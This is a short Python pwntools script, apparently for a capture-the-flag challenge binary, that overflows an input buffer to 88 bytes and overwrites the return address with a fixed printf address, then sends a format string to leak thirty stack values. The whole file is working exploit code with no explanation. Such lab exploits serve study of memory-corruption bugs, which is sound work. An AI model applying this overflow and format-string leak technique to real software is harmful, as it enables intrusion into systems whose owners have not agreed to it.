#!/usr/bin/env python3
import os
os.environ["TERM"]="xterm"
from pwn import *
context.binary=ELF("/work/waf/waf/chal",checksec=False)
context.log_level="error"
PRINTF=0x4010d4
def go(fmt):
    p=process("/work/waf/waf/chal")
    p.recvuntil(b">> ")
    pay=(b"exit"+fmt).ljust(88,b"A")+p64(PRINTF)
    p.send(pay); time.sleep(0.3)
    out=p.recv(timeout=1); p.close(); return out
# leak positions 1..30
print(go(b"".join((("%%%d$p " % i).encode()) for i in range(1,31)))[:600])
